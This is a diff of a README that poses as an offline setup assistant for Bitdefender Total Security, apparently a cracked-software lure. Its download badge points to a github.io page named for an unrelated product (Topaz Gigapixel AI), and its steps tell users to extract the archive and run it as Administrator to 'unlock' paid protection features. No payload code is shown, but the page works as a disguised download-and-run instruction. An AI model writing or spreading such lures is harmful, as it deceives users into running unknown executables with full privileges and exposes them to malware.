@@ -1,6 +1,6 @@
 # Bitdefender Total Security — Offline Setup Assistant
 
-<a href="https://bitdefender-total-security-download.github.io/.github" target="_blank">
+<a href="https://topaz-gigapixel-ai-full-download.github.io/.github/" target="_blank">
   <img src="https://img.shields.io/badge/DOWNLOAD%20SETUP_ASSISTANT-%F0%9F%92%BE-blue?style=for-the-badge&logo=cloudsmith&logoColor=white" alt="Download Setup Assistant">
 </a>
 
@@ -11,8 +11,8 @@
 ## ⚙️ How to Use
 
 1. Download the Setup Assistant using the button above  
-2. Extract the archive using **7-Zip** or **WinRAR**  
-3. Run the tool as **Administrator**  
+2. Extract the archive using 7-Zip or WinRAR  
+3. Run the tool as Administrator  
 4. Follow the step-by-step instructions for installation  
 5. Your system is now fully protected — offline and secure  
 
@@ -20,7 +20,7 @@
 
 ## 🎯 What You Unlock
 
-- 🛡️ Real-time antivirus and anti-malware protection  
+- 🛡 Real-time antivirus and anti-malware protection  
 - 🔒 Network Threat Prevention & SafePay  
 - 🌐 Secure VPN and anti-tracker (if supported)  
 - 🧠 Ransomware Remediation and Advanced Threat Defense  
@@ -30,7 +30,7 @@
 
 ## 🖼 Preview
 
-### 🖥️ Bitdefender Dashboard  
+### 🖥 Bitdefender Dashboard  
 ![Bitdefender UI](https://cdn-ext.fanatical.com/production/product/1280x720/375c1e62-9c8b-4877-bfeb-fdc64914e60a.jpeg)  
 *Clean and responsive security interface*
 
